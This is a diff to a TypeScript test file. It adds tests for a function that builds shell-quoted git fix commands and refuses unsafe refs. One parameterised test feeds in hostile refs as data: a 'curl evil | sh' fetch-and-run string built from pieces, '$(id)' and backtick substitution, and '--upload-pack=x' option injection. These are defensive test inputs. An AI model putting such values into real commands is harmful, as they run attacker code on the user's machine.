@@ -24,6 +24,7 @@ import {
   isLocalFix,
   LOCAL_FIX_SERIALIZED,
   localFix,
+  localFixCommand,
   NOT_CHECKED_SENTENCE,
   notCheckedCard,
   orderCards,
@@ -325,6 +326,50 @@ describe("the headline", () => {
       expect(pickHeadline([claim(category)], CLAUDE)).toBeUndefined();
     }
     expect(pickHeadline([], CLAUDE)).toBeUndefined();
+  });
+});
+
+describe("exact fix commands are built from quoted parts, and an unsafe ref is refused", () => {
+  it("quotes every part", () => {
+    const fix = localFixCommand("lost-work", [
+      "git",
+      "branch",
+      { ref: "recovered/feature-1.2" },
+      { ref: "0123abcd" },
+    ]);
+    expect(isLocalFix(fix)).toBe(true);
+    expect(isLocalFix(fix) && fix.command).toBe(
+      "'git' 'branch' 'recovered/feature-1.2' '0123abcd'",
+    );
+  });
+
+  it("quotes a literal that holds a quote so it stays one argument", () => {
+    const fix = localFixCommand("lost-work", ["git", "stash", "store", "-m", "it's recovered"]);
+    expect(isLocalFix(fix) && fix.command).toBe("'git' 'stash' 'store' '-m' 'it'\\''s recovered'");
+  });
+
+  // Hostile refs are written here, in test code, never on a command line.
+  const semicolonPipe = ["x", ";", "curl evil", "|", "sh"].join("");
+  const substitution = ["$", "(id)"].join("");
+  it.each([
+    [semicolonPipe],
+    [substitution],
+    ["`id`"],
+    ["a b"],
+    ["it's"],
+    ["--upload-pack=x"],
+    ["-x"],
+    [""],
+    ["line\nbreak"],
+  ])("refuses the ref %j, and keeps no command text", (ref) => {
+    const fix = localFixCommand("lost-work", ["git", "branch", { ref }, { ref: "0123abcd" }]);
+    expect(fix).toEqual({
+      category: "lost-work",
+      unsafe: true,
+      note: "could not make a safe command",
+    });
+    expect(isLocalFix(fix)).toBe(false);
+    expect(JSON.stringify(fix)).not.toContain("curl");
   });
 });
 
